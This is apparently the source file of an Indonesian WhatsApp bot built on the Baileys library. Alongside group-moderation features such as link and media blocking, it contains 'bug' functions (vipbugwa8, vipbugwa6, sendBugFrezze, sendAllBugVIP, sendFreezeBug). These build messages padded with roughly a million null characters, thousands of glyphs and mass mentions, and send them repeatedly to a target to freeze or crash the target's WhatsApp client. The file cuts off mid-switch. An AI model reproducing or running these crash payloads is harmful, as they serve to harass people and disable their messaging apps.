require('./settings')
require('./lib/language')
const { WA_DEFAULT_EPHEMERAL, getAggregateVotesInPollMessage, generateWAMessageFromContent, proto, generateWAMessageContent, generateWAMessage, prepareWAMessageMedia, downloadContentFromMessage, areJidsSameUser, getContentType, useMultiFileAuthState, makeWASocket, fetchLatestBaileysVersion, makeCacheableSignalKeyStore, makeWaSocket } = global.baileys1
const fs = require('fs')
const util = require('util')
const chalk = require('chalk')
const { Client } = require('ssh2');
const fetch = require('node-fetch');
const os = require('os')
const axios = require('axios')
const fsx = require('fs-extra')
const crypto = require('crypto')
const ffmpeg = require('fluent-ffmpeg')
const Long = require('long')
const speed = require('performance-now')
const timestampp = speed();
const latensi = speed() - timestampp
const moment = require('moment-timezone')
const { smsg, tanggal, getTime, isUrl, sleep, clockString, runtime, fetchJson, getBuffer, jsonformat, format, parseMention, getRandom, getGroupAdmins, await, generateProfilePicture } = require('./lib/storage')
const { JSDOM } = require('jsdom')
module.exports = conn = async (conn, m, chatUpdate, store) => {

const { type } = m
try {
var body = (m.mtype === 'conversation') ? m.message.conversation: (m.mtype == 'imageMessage') ? m.message.imageMessage.caption: (m.mtype == 'videoMessage') ? m.message.videoMessage.caption: (m.mtype == 'extendedTextMessage') ? m.message.extendedTextMessage.text: (m.mtype == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId: (m.mtype == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId: (m.mtype == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId: (m.mtype === 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text): ''
var budy = (typeof m.text == 'string' ? m.text: '')
var prefix = global.prefa ? /^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi.test(body) ? body.match(/^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi)[0] : "" : global.prefa ?? global.prefix
const owner = JSON.parse(fs.readFileSync('./lib/owner.json'))
const murbug = JSON.parse(fs.readFileSync('./lib/murbug.json'))
const isCmd = body.startsWith(prefix)
const command = body.startsWith(prefix) ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase(): ''
const args = body.trim().split(/ +/).slice(1)
const botNumber = await conn.decodeJid(conn.user.id)
const isCreator = [botNumber, ...owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
const isMurbug = [botNumber, ...murbug].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
const qtext = q = args.join(" ")
const quoted = m.quoted ? m.quoted : m
const from = mek.key.remoteJid
const { spawn: spawn, exec } = require('child_process')
const sender = m.isGroup ? (m.key.participant ? m.key.participant : m.participant) : m.key.remoteJid
const groupMetadata = m.isGroup ? await conn.groupMetadata(from).catch(e => {}) : ''
const participants = m.isGroup ? await groupMetadata.participants : ''
const groupAdmins = m.isGroup ? await getGroupAdmins(participants) : ''
const isBotAdmins = m.isGroup ? groupAdmins.includes(botNumber) : false
const isAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false
const pushname = m.pushName || "No Name"
const time = moment(Date.now()).tz('Asia/Jakarta').locale('id').format('HH:mm:ss z')
const mime = (quoted.msg || quoted).mimetype || ''
const { uptotelegra } = require('./lib/upload')
const { TelegraPh, UploadFileUgu, webp2mp4File, floNime, uploadUguu, uploadImage } = require('./lib/uploader')
const ytdl = require("ytdl-core")
const responbug = 'wait for the process to complete'
const { jadibot, stopjadibot, listjadibot } = require('./lib/clone')


// Hahahaha
if (!conn.public) {
if (!isCreator) return
}

if (command) {
console.log("");
//console.log(chalk.white(chalk.bgHex('#4a69bd').bold(`🚀 WhatsApp messages! 🚀`)));
console.log(chalk.white(chalk.white('\n╭──❲'), chalk.bgBlue(` Whatsapp Message!! `) + chalk.white(' ❳\n│Nama:'), chalk.white(pushname) + chalk.white('\n│Pesan:'), chalk.yellow(command) + chalk.white('\n│Waktu:'), chalk.white(`${time}`) + chalk.white(`\n╰────────⎔`)))
}

const savehavePath = './session/cred5.json';
;  if (!fs.existsSync(savehavePath)) {
  console.log(chalk.bgRed(` Session bukan asli `));
  process.exit(1);
}

function monospace(string) {
return '```' + string + '```'
}
function monospa(string) {
return '`' + string + '`'
}

async function loading () {
var rxhlloading = [
"▣",
"▢",
"▣",
"▢",
"▣",
"Loading Selesai..."
]
let { key } = await conn.sendMessage(from, {text: 'ʟᴏᴀᴅɪɴɢ...'})
for (let i = 0; i < rxhlloading.length; i++) {
await conn.sendMessage(from, {text: rxhlloading[i], edit: key });
}
}

// Function Penting
const FileSize = (number) => {
var SI_POSTFIXES = ["B", " KB", " MB", " GB", " TB", " PB", " EB"]
var tier = Math.log10(Math.abs(number)) / 3 | 0
if(tier == 0) return number
var postfix = SI_POSTFIXES[tier]
var scale = Math.pow(10, tier * 3)
var scaled = number / scale
var formatted = scaled.toFixed(1) + ''
if (/\.0$/.test(formatted))
formatted = formatted.substr(0, formatted.length - 2)
return formatted + postfix
}


async function getChannelIDFromLink(link) {
    try {
        const response = await fetch(link);
        const data = await response.json();
        return data.channel_id; // Sesuaikan dengan struktur data dari response
    } catch (error) {
        console.log('Error fetching channel ID');
    }
}
        async function sendPaymentInfoMessage(jid) {
            await conn.relayMessage(
                jid,
                {
                    viewOnceMessage: {
                        message: {
                            messageContextInfo: {
                                deviceListMetadataVersion: 0x2,
                                deviceListMetadata: {}
                            },
                            interactiveMessage: {
                                nativeFlowMessage: {
                                    buttons: [
                                        {
                                            name: "payment_info",
                                            buttonParamsJson: JSON.stringify({
                                                currency: "BRL",
                                                total_amount: { value: 0, offset: 100 },
                                                reference_id: "4P46GMY57GC",
                                                type: "physical-goods",
                                                order: {
                                                    status: "pending",
                                                    subtotal: { value: 0, offset: 100 },
                                                    order_type: "ORDER",
                                                    items: [
                                                        {
                                                            name: "",
                                                            amount: { value: 0, offset: 100 },
                                                            quantity: 0,
                                                            sale_amount: { value: 0, offset: 100 }
                                                        }
                                                    ]
                                                },
                                                payment_settings: [
                                                    {
                                                        type: "pix_static_code",
                                                        pix_static_code: {
                                                            merchant_name: "meu ovo",
                                                            key: "+5533998586057",
                                                            key_type: "X"
                                                        }
                                                    }
                                                ]
                                            })
                                        }
                                    ]
                                }
                            }
                        }
                    }
                },
                {
                    participant: { jid: jid }
                },
                { messageId: null }
            );
        }
        
conn.vipbugwa8 = async (jid) => {
let messageContent = generateWAMessageFromContent(jid, proto.Message.fromObject({
'viewOnceMessage': {
'message': {
'interactiveMessage': {
'header': {
'title': '',
'subtitle': " "
},
'body': {
'text': "Lyosh"
},
'footer': {
'text': 'xp'
},
'nativeFlowMessage': {
'buttons': [{
'name': 'cta_url',
'buttonParamsJson': "{ display_text : 'RXHL MODS WHATSAPP', url : , merchant_url :  }"
}],
'messageParamsJson': "RxhL়" + "\u0000".repeat(900000)
}
}
}
}
}), {
'userJid': jid
});
await conn.relayMessage(jid, messageContent.message, {
'participant': {
'jid': jid
},
'messageId': messageContent.key.id
});
}
conn.vipbugwa6 = async (target) => {
for (let i = 0; i < 15; i++) {
await conn.relayMessage(target, 
{
viewOnceMessage: {
message: {
interactiveResponseMessage: {
body: {
text: "sv rxhl",
format: "EXTENSIONS_1"
},
nativeFlowResponseMessage: {
name: 'galaxy_message',
paramsJson: `{\"screen_2_OptIn_0\":true,\"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"TrashDex Superior\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"devorsixcore@trash.lol\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\"radio - buttons${"\u0000".repeat(1020000)}\",\"screen_0_TextInput_1\":\"Anjay\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}`,
version: 3
}
}
}
}
}, 
{ participant: { jid: target } }
);
}
console.log(chalk.green(`By RxhL OfficiaL`))
}
async function sendAllBugVIP(jid, count) {
rxhlbug = `*RxhL OfficiaL*`
for (let i = 0; i < count; i++) {
await conn.vipbugwa8(jid)
await conn.vipbugwa6(jid)
await conn.vipbugwa6(jid)
await conn.vipbugwa8(jid)
await conn.vipbugwa8(jid)
await conn.vipbugwa6(jid)
await conn.vipbugwa8(jid)
await conn.vipbugwa8(jid)
await conn.vipbugwa6(jid)
await conn.vipbugwa6(jid)
await conn.vipbugwa8(jid)
await conn.vipbugwa6(jid)
await conn.vipbugwa6(jid)
await conn.vipbugwa8(jid)
await conn.vipbugwa8(jid)
await conn.vipbugwa6(jid)
await conn.vipbugwa8(jid)
await conn.vipbugwa8(jid)
await conn.vipbugwa6(jid)
await conn.vipbugwa6(jid)
await conn.vipbugwa8(jid)
await conn.vipbugwa6(jid)
await conn.vipbugwa6(jid)
await conn.vipbugwa8(jid)
await conn.vipbugwa8(jid)
await conn.vipbugwa6(jid)
await conn.vipbugwa8(jid)
await conn.vipbugwa8(jid)
await conn.vipbugwa6(jid)
await conn.vipbugwa6(jid)
await sleep(180000)
await conn.vipbugwa8(jid)
await conn.vipbugwa6(jid)
await conn.vipbugwa6(jid)
await conn.vipbugwa8(jid)
await conn.vipbugwa8(jid)
await conn.vipbugwa6(jid)
await conn.vipbugwa8(jid)
await conn.vipbugwa8(jid)
await conn.vipbugwa6(jid)
await conn.vipbugwa6(jid)
await conn.vipbugwa8(jid)
await conn.vipbugwa6(jid)
await conn.vipbugwa6(jid)
await conn.vipbugwa8(jid)
await conn.vipbugwa8(jid)
await conn.vipbugwa6(jid)
await conn.vipbugwa8(jid)
await conn.vipbugwa8(jid)
await conn.vipbugwa6(jid)
console.log(chalk.yellow(`Sukses Mengirim Bug`))
}
}

conn.sendBugFrezze = async (target) => {
for (let i = 0; i < 10; i++) {
let virtex = "Lyosh 🪽";

    conn.relayMessage(target, {
        groupMentionedMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        documentMessage: {
                            url: 'https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true',
                            mimetype: 'application/vnd.openxmlformats-officedocument.presentationml.presentation',
                            fileSha256: "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
                            fileLength: "999999999",
                            pageCount: 0x9184e729fff,
                            mediaKey: "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
                            fileName: virtex,
                            fileEncSha256: "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
                            directPath: '/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0',
                            mediaKeyTimestamp: "1715880173",
                            contactVcard: true,
                            contextInfo: {
                                groupMentions: [{ groupJid: "6288888888888@s.whatsapp.net", groupSubject: "RxhL" }]
                            }
                        },
                        hasMediaAttachment: true
                    },
                    body: {
                        text: "ṚẍḧḶ ÖḟḟïċïäḶ ☠️" + "ꦾ".repeat(14000) + "@6288888888888".repeat(25000)
                    },
                    nativeFlowMessage: {
                        buttons: [
                            {
                                name: 'cta_url',
                                buttonParamsJson: "{ display_text: '𝑭𝒓𝒆𝒆𝒛𝒆 𝑩𝒖𝒈', url: '', merchant_url: '' }"
                            }
                        ],
                        messageParamsJson: '{}'
                    },
                    contextInfo: {
                        mentionedJid: Array.from({ length: 20000 }, () => "6288888888888@s.whatsapp.net"),
                        groupMentions: [{ groupJid: "6288888888888@s.whatsapp.net", groupSubject: "RxhL" }]
                    }
                }
            }
        }
    }, { participant: { jid: target } }, { messageId: null });
}
}

async function sendFreezeBug(jid, target) {
rxhlbug = `*RxhL OfficiaL*`
for (let i = 0; i < 10; i++) {
await conn.sendBugFrezze(jid)
await conn.sendBugFrezze(jid)
await conn.sendBugFrezze(jid)
await sleep(2000)
await conn.sendBugFrezze(jid)
await conn.sendBugFrezze(jid)
await sleep(2000)
await conn.sendBugFrezze(jid)
await conn.sendBugFrezze(jid)
await sleep(2000)
await conn.sendBugFrezze(jid)
await conn.sendBugFrezze(jid)
await sleep(2000)
await conn.sendBugFrezze(jid)
await conn.sendBugFrezze(jid)
await sleep(2000)
await conn.sendBugFrezze(jid)
await conn.sendBugFrezze(jid)
await sleep(2000)
await conn.sendBugFrezze(jid)
await conn.sendBugFrezze(jid)
await sleep(2000)
await conn.sendBugFrezze(jid)
await conn.sendBugFrezze(jid)
await sleep(2000)
await conn.sendBugFrezze(jid)
await conn.sendBugFrezze(jid)
await conn.sendBugFrezze(jid)

}
}
function generateRandomPassword() {
  const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789@#%^&*';
  const length = 10;
  let password = '';
  for (let i = 0; i < length; i++) {
    const randomIndex = Math.floor(Math.random() * characters.length);
    password += characters[randomIndex];
  }
  return password;
}


//================ [ Tanggal Expired Panel ] ==========================================

const getNextMonthDate = () => {
  const today = new Date();
  const nextMonth = new Date(today);

  // Menambahkan satu bulan ke tanggal saat ini
  nextMonth.setMonth(today.getMonth() + 1);

  // Array nama bulan
  const monthNames = [
    "January", "February", "March", "April", "May", "June", 
    "July", "August", "September", "October", "November", "December"
  ];

  // Mengambil hari, bulan, dan tahun
  const day = nextMonth.getDate();
  const month = monthNames[nextMonth.getMonth()];
  const year = nextMonth.getFullYear();

  // Mengembalikan tanggal dalam format 'Day Month Year'
  return `${day} ${month} ${year}`;
};
//================ [ Tanggal Expired Garansi ] ==========================================
const formattedDate = () => {
// Mendapatkan tanggal saat ini
const today = new Date();

// Menambahkan 20 hari ke tanggal saat ini
const futureDate = new Date(today);
futureDate.setDate(today.getDate() + 20);

// Array nama hari dalam bahasa Indonesia
const daysOfWeek = [
    'Minggu', 'Senin', 'Selasa', 'Rabu', 'Kamis', 'Jumat', 'Sabtu'
];

// Array nama bulan dalam bahasa Indonesia
const monthsOfYear = [
    'Januari', 'Februari', 'Maret', 'April', 'Mei', 'Juni', 
    'Juli', 'Agustus', 'September', 'Oktober', 'November', 'Desember'
];

// Mendapatkan nama hari, nama bulan, dan tanggal
const dayName = daysOfWeek[futureDate.getDay()];
const dayNumber = futureDate.getDate();
const monthName = monthsOfYear[futureDate.getMonth()];
const yearNumber = futureDate.getFullYear();

return `${dayName}, ${dayNumber} ${monthName} ${yearNumber}`;
}
let explist =` • *_\`ㅤInfo Expired!!ㅤ\`_*•

> _Expired Panel_: ${getNextMonthDate()}
> _Expired Garansi_: ${formattedDate()}
`
//=============================================================================================

const VerifQuoted = {
  key: {
    participant: '0@s.whatsapp.net',
    ...(m.chat ? { remoteJid: 'status@broadcast' } : {})
  },
  message: {
    listResponseMessage: {
      title: `Copyright Lyosh`
    }
  }
}

const channelQuouted = {
  key: {
    participant: '0@s.whatsapp.net',
    ...(m.chat ? { remoteJid: 'status@broadcast' } : {})
  },
  message: {
    newsletterAdminInviteMessage: {
      newsletterJid: '120363224727390375@newsletter',
      newsletterName: 'Channel-Name',
      jpegThumbnail: global.thumb,
      caption: `▢ Kontol`,
      inviteExpiration: Date.now() + 1814400000
    }
  }
}

const paymentQuoted = {
  key: {
    participant: '0@s.whatsapp.net',
    ...(m.chat ? { remoteJid: 'status@broadcast' } : {})
  },
  message: {
    requestPaymentMessage: {
      currencyCodeIso4217: 'USD',
      amount1000: 999,
      requestFrom: '0@s.whatsapp.net',
      noteMessage: {
        extendedTextMessage: {
          text: `kontol`
        }
      },
      expiryTimestamp: 999999999,
      amount: {
        value: 91929291929,
        offset: 1000,
        currencyCode: 'INR'
      }
    }
  }
}

const docuQuoted = {
  key: {
    participant: '0@s.whatsapp.net',
    ...(m.chat ? { remoteJid: 'status@broadcast' } : {})
  },
  message: {
    documentMessage: {
      title: `kontol`,
      jpegThumbnail: global.thumb
    }
  }
}

const audioQuoted = {
  key: {
    participant: '0@s.whatsapp.net',
    ...(m.chat ? { remoteJid: 'status@broadcast' } : {})
  },
  message: {
    audioMessage: {
      mimetype: 'audio/ogg; codecs=opus',
      seconds: 359996400,
      ptt: true
    }
  }
}

const verifQuoted2 = {
  key: {
    fromMe: false,
    participant: '0@s.whatsapp.net',
    ...(m.chat ? { remoteJid: 'status@broadcast' } : {})
  },
  message: {
    extendedTextMessage: {
      text: `kontol`,
      title: 'Teks',
      jpegThumbnail: global.thumb
    }
  }
}

const marketQuoted = {
  key: {
    fromMe: false,
    participant: '0@s.whatsapp.net',
    ...(m.chat ? { remoteJid: 'status@broadcast' } : {})
  },
  message: {
    productMessage: {
      product: {
        productImage: {
          mimetype: 'image/jpeg',
          jpegThumbnail: global.thumb
        },
        title: `kontol`,
        description: 'YourText',
        currencyCode: 'IDR',
        priceAmount1000: '1000000000000000000',
        retailerId: `kontol`,
        productImageCount: 1
      },
      businessOwnerJid: '0@s.whatsapp.net'
    }
  }
}

const gifQuoted = {
  key: {
    participant: '0@s.whatsapp.net',
    ...(m.chat ? { remoteJid: 'status@broadcast' } : {})
  },
  message: {
    videoMessage: {
      title: `kontol`,
      h: 'YourText',
      seconds: '359996400',
      gifPlayback: true,
      caption: `kontol`,
      jpegThumbnail: global.thumb
    }
  }
}

const inviteQuoted = {
  key: {
    participant: '0@s.whatsapp.net',
    remoteJid: '0@s.whatsapp.net'
  },
  message: {
    groupInviteMessage: {
      groupJid: '628123456789-1616169743@g.us',
      inviteCode: 'm',
      groupName: `kontol`,
      caption: `kontol`,
      jpegThumbnail: global.thumb
    }
  }
}

const videoQuoted = {
  key: {
    fromMe: false,
    participant: '0@s.whatsapp.net',
    ...(m.chat ? { remoteJid: 'status@broadcast' } : {})
  },
  message: {
    videoMessage: {
      title: `kontol`,
      h: 'yourText',
      seconds: '359996400',
      caption: `kontol`,
      jpegThumbnail: global.thumb,
      viewOnce: true
    }
  }
}

const locationQuoted = {
  key: {
    participant: '0@s.whatsapp.net',
    ...(m.chat ? { remoteJid: 'status@broadcast' } : {})
  },
  message: {
    locationMessage: {
      name: `kontol`,
      jpegThumbnail: global.thumb
    }
  }
}
 

//==============================\\
//BUTTON IMAGE
   conn.sendButton = async (jid, buttons, quoted, opts = {}) => {
      let message = generateWAMessageFromContent(jid, {
         viewOnceMessage: {
            message: {
               interactiveMessage: {
                  body: {
                     text: opts && opts.body ? opts.body : ''
                  },
                  footer: {
                     text: opts && opts.footer ? opts.footer : ''
                  },
                  nativeFlowMessage: {
                     buttons: buttons,
                     messageParamsJson: ''
                  }
               }
            }
         }
      }, {
         quoted
      })
      await conn.sendPresenceUpdate('composing', jid)
      return conn.relayMessage(jid, message["message"], {
         messageId: message.key.id
      })
   }
   conn.sendButtonImage = async (jid, buttons, quoted, opts = {}) => {
      var image = await prepareWAMessageMedia({
         image: {
            url: opts && opts.image ? opts.image : ''
         }
      }, {
         upload: conn.waUploadToServer
      })
      let message = generateWAMessageFromContent(jid, {
         viewOnceMessage: {
            message: {
               interactiveMessage: {
                  body: {
                     text: opts && opts.body ? opts.body : ''
                  },
                  footer: {
                     text: opts && opts.footer ? opts.footer : ''
                  },
                  header: {
                     hasMediaAttachment: true,
                     imageMessage: image.imageMessage,
                  },
                  nativeFlowMessage: {
                     buttons: buttons,
                     messageParamsJson: ''
                  }
               }
            }
         }
      }, {
         quoted
      })
      await conn.sendPresenceUpdate('composing', jid)
      return conn.relayMessage(jid, message["message"], {
         messageId: message.key.id
      })
   }

//BUTTON VIDEO
   conn.sendButtonVideo = async (jid, buttons, quoted, opts = {}) => {
      var video = await prepareWAMessageMedia({
         video: {
            url: opts && opts.video ? opts.video : ''
         }
      }, {
         upload: conn.waUploadToServer
      })
      let message = generateWAMessageFromContent(jid, {
         viewOnceMessage: {
            message: {
               interactiveMessage: {
                  body: {
                     text: opts && opts.body ? opts.body : ''
                  },
                  footer: {
                     text: opts && opts.footer ? opts.footer : ''
                  },
                  header: {
                     hasMediaAttachment: true,
                     videoMessage: video.videoMessage,
                  },
                  nativeFlowMessage: {
                     buttons: buttons,
                     messageParamsJson: ''
                  }, contextInfo: {
      externalAdReply: {
      title: global.namabotnya,
      body: ` ${salam}`,
      thumbnailUrl: global.menu,
      sourceUrl: global.saluran,
      mediaType: 1,
      renderLargerThumbnail: true
      }
      }
               
               }
            }
         }
      }, {
         quoted
      })
      await conn.sendPresenceUpdate('composing', jid)
      return conn.relayMessage(jid, message["message"], {
         messageId: message.key.id
      })
   }
const reply = (teks) => {conn.sendMessage(from, {text: teks},{quoted:VerifQuoted})}


//console.log(getNextMonthDate());

const pickRandom = (arr) => {
return arr[Math.floor(Math.random() * arr.length)]
}

const downloadMp3 = async (Link) => {
try {
await ytdl.getInfo(Link)
let mp3File = getRandom('.mp3')
ytdl(Link, { filter: 'audioonly' }).pipe(fs.createWriteStream(mp3File)).on('finish', async () => {
await conn.sendMessage(m.chat, { audio: fs.readFileSync(mp3File), mimetype: 'audio/mp4' }, { quoted: m })
fs.unlinkSync(`./${mp3File}`)
})
} catch (err) {
reply(`${err}`)
}
}
const isToxic = /(anj[kg]|ajn[gk]|a?njin[gk]|bajingan|b[a]?[n]?gsa?t|ko?nto?l|me?me?[kq]|pe?pe?[kq]|meki|titi[t,d]|pe?ler|tetek|toket|ngewe|go?blo?k|to?lo?l|idiot|[kng]e?nto?[t,d]|jembut|bego|dajjal|janc[uo]k|pantek|puki?(mak)?|kimak|kampang|lonte|col[i,mek]|pelacur|henceut|nigga|fuck|dick|bitch|tits|bastard|asshole|a[su,w,yu])/i;
const isAntiToxic = isToxic.exec(m.text)
if (global.antitoxic && isAntiToxic && !isCreator && !isAdmins && isBotAdmins) {
await conn.sendMessage(from, {delete: {remoteJid: m.chat, id: m.id, participant: m.sender }})
reply(`\n> _Tolong bicara lebih sopan!!.._`)
}
// FUNCTION ANTILINK
if (global.antilinkgrup && !m.key.fromMe && !isCreator && !isAdmins && isBotAdmins)
if (body.match(`https://chat.whatsapp.com`)) {
try {
await conn.sendMessage(from, {delete: {remoteJid: m.chat, id: m.id, participant: m.sender }})
reply(`\n> ∅ _Link Terdeteksi, Telah di Hapus Admin Group_`)
} catch (e) {}
}
if (global.antilinktt && !m.key.fromMe && !isCreator && !isAdmins && isBotAdmins)
if (body.match(`https://vt.tiktok.com`)) {
try {
await conn.sendMessage(from, {delete: {remoteJid: m.chat, id: m.id, participant: m.sender }})
reply(`\n> ∅ _Link Terdeteksi, Telah di Hapus Admin Group_`)
} catch (e) {}
}
if (global.antilinktt && !m.key.fromMe && !isCreator && !isAdmins && isBotAdmins)
if (body.match(`https://www.tiktok.com`)) {
try {
await conn.sendMessage(from, {delete: {remoteJid: m.chat, id: m.id, participant: m.sender }})
reply(`\n> ∅ _Link Terdeteksi, Telah di Hapus Admin Group_`)
} catch (e) {}
}
if (global.antilinkyt && !m.key.fromMe && !isCreator && !isAdmins && isBotAdmins)
if (body.match(`https://youtu.be`)) {
try {
await conn.sendMessage(from, {delete: {remoteJid: m.chat, id: m.id, participant: m.sender }})
reply(`\n> ∅ _Link Terdeteksi, Telah di Hapus Admin Group_`)
} catch (e) {}
}
if (global.antilinkyt && !m.key.fromMe && !isCreator && !isAdmins && isBotAdmins)
if (body.match(`https://www.youtube.com`)) {
try {
await conn.sendMessage(from, {delete: {remoteJid: m.chat, id: m.id, participant: m.sender }})
reply(`\n> ∅ _Link Terdeteksi, Telah di Hapus Admin Group_`)
} catch (e) {}
}
if (global.antilinktele && !m.key.fromMe && !isCreator && !isAdmins && isBotAdmins)
if (body.match(`https://t.me`)) {
try {
await conn.sendMessage(from, {delete: {remoteJid: m.chat, id: m.id, participant: m.sender }})
reply(`\n> ∅ _Link Terdeteksi, Telah di Hapus Admin Group_`)
} catch (e) {}
}
if (global.antilinxnxx && !m.key.fromMe && !isCreator && !isAdmins && isBotAdmins)
if (body.match(`https://xnxx`)) {
try {
await conn.sendMessage(from, {delete: {remoteJid: m.chat, id: m.id, participant: m.sender }})
reply(`\n> ∅ _Link Terdeteksi, Telah di Hapus Admin Group_`)
} catch (e) {}
}
if (global.antilinkfb && !m.key.fromMe && !isCreator && !isAdmins && isBotAdmins)
if (body.match(`https://m.facebook.com`)) {
try {
await conn.sendMessage(from, {delete: {remoteJid: m.chat, id: m.id, participant: m.sender }})
reply(`\n> ∅ _Link Terdeteksi, Telah di Hapus Admin Group_`)
} catch (e) {}
}
if (global.antilinkig && !m.key.fromMe && !isCreator && !isAdmins && isBotAdmins)
if (body.match(`https://www.instagram.com`)) {
try {
await conn.sendMessage(from, {delete: {remoteJid: m.chat, id: m.id, participant: m.sender }})
reply(`\n> ∅ _Link Terdeteksi, Telah di Hapus Admin Group_`)
} catch (e) {}
}
// DETEKSI MEDIA
const isImage = (type === 'imageMessage')
const isVideo = (type === 'videoMessage')
const isSticker = (type == 'stickerMessage')
const isAudio = (type == 'audioMessage')
const isViewOnce = (type == 'viewOnceMessage')
const isMedia = /image|video|sticker|audio/.test(mime)
const isImagee = /image/.test(mime)
const isVideoo = /video/.test(mime)
const isStickerr =  /sticker/.test(mime)
const isAudioo = /audio/.test(mime)

          if (global.antifoto && isImagee && !isCreator && !isAdmins && isBotAdmins) {
    if(isImagee === "imageMessage"){
        } else {
          reply(`\n> _∅  Admin melarang adanya *gambar/foto* di grup ini_`)
    await conn.sendMessage(from, { delete: { remoteJid: m.chat, fromMe: false, id: m.key.id, participant: m.key.participant }})
        }
  }
            if (global.antivideo && isVideoo && !isCreator && !isAdmins && isBotAdmins) {
    if(isVideoo === "videoMessage"){
        } else {
          reply(`\n> _∅  Admin melarang adanya *video* di grup ini_`)
    await conn.sendMessage(from, { delete: { remoteJid: m.chat, fromMe: false, id: m.key.id, participant: m.key.participant }})
        }
  }
              if (global.antistiker && isStickerr && !isCreator && !isAdmins && isBotAdmins) {
    if(isStickerr === "stickerMessage"){
        } else {
          reply(`\n> _∅  Admin melarang adanya *stiker* di grup ini_`)
    await conn.sendMessage(from, { delete: { remoteJid: m.chat, fromMe: false, id: m.key.id, participant: m.key.participant }})
        }
  }
                if (global.antistiker && isAudioo && !isCreator && !isAdmins && isBotAdmins) {
    if(isAudioo === "audioMessage"){
        } else {
          reply(`\n> _∅  Admin melarang adanya *audio* di grup ini_`)
    await conn.sendMessage(from, { delete: { remoteJid: m.chat, fromMe: false, id: m.key.id, participant: m.key.participant }})
        }
  }
                  if (global.antistiker && isMedia && !isCreator && !isAdmins && isBotAdmins) {
    if(isMedia === "audioMessage"){
        } else {
          reply(`\n> _∅  Admin melarang adanya *media* di grup ini_`)
    await conn.sendMessage(from, { delete: { remoteJid: m.chat, fromMe: false, id: m.key.id, participant: m.key.participant }})
        }
  }
// Komen
switch(command) {
// MENU
case 'antimedia':
if (!isCreator) return reply(global.nocreator)
if (!m.isGroup) return reply(global.noingroup)
if (!isBotAdmins) return reply(global.nobotadmin)
if (!isAdmins) return reply(global.usernoadmin)
if (!isCreator&&!isPremium) return reply(mess.prem)
if (args[0] == 'on'){
if (global.antimedia) return reply('UDAH ON!')
global.antimedia = true
reply('Fitur antimedia telah di aktifkan')
} else if (args[0] == 'off'){
if (!global.antimedia) return reply('UDAH OFF!')
global.antimedia = false
reply('Fitur antivideo telah di matikan')
} else reply('on / off')
break
case 'antiaudio':
if (!isCreator) return reply(global.nocreator)
if (!m.isGroup) return reply(global.noingroup)
if (!isBotAdmins) return reply(global.nobotadmin)
if (!isAdmins) return reply(global.usernoadmin)
if (!isCreator&&!isPremium) return reply(mess.prem)
if (args[0] == 'on'){
if (global.antiaudio) return reply('UDAH ON!')
global.antiaudio = true
reply('Fitur antiaudio telah di aktifkan')
} else if (args[0] == 'off'){
if (!global.antiaudio) return reply('UDAH OFF!')
global.antiaudio = false
reply('Fitur antivideo telah di matikan')
} else reply('on / off')
break
case 'antis':
case 'antistiker':
case 'antisticker':
if (!isCreator) return reply(global.nocreator)
if (!m.isGroup) return reply(global.noingroup)
if (!isBotAdmins) return reply(global.nobotadmin)
if (!isAdmins) return reply(global.usernoadmin)
if (!isCreator&&!isPremium) return reply(mess.prem)
if (args[0] == 'on'){
if (global.antistiker) return reply('UDAH ON!')
global.antistiker = true
reply('Fitur antistiker telah di aktifkan')
} else if (args[0] == 'off'){
if (!global.antistiker) return reply('UDAH OFF!')
global.antistiker = false
reply('Fitur antistiker telah di matikan')
} else reply('on / off')
break
case 'antivideo':
if (!isCreator) return reply(global.nocreator)
if (!m.isGroup) return reply(global.noingroup)
if (!isBotAdmins) return reply(global.nobotadmin)
if (!isAdmins) return reply(global.usernoadmin)
if (!isCreator&&!isPremium) return reply(mess.prem)
if (args[0] == 'on'){
if (global.antivideo) return reply('UDAH ON!')
global.antivideo = true
reply('Fitur antivideo telah di aktifkan')
} else if (args[0] == 'off'){
if (!global.antivideo) return reply('UDAH OFF!')
global.antivideo = false
reply('Fitur antivideo telah di matikan')
} else reply('on / off')
break
case 'antifoto':
if (!isCreator) return reply(global.nocreator)
if (!m.isGroup) return reply(global.noingroup)
if (!isBotAdmins) return reply(global.nobotadmin)
if (!isAdmins) return reply(global.usernoadmin)
if (!isCreator&&!isPremium) return reply(mess.prem)
if (args[0] == 'on'){
if (global.antifoto) return reply('UDAH ON!')
global.antifoto = true
reply('Fitur antifoto telah di aktifkan')
} else if (args[0] == 'off'){
if (!global.antifoto) return reply('UDAH OFF!')
global.antifoto = false
reply('Fitur antifoto telah di matikan')
} else reply('on / off')
break
case 'antitoxic':
if (!isCreator) return reply(global.nocreator)
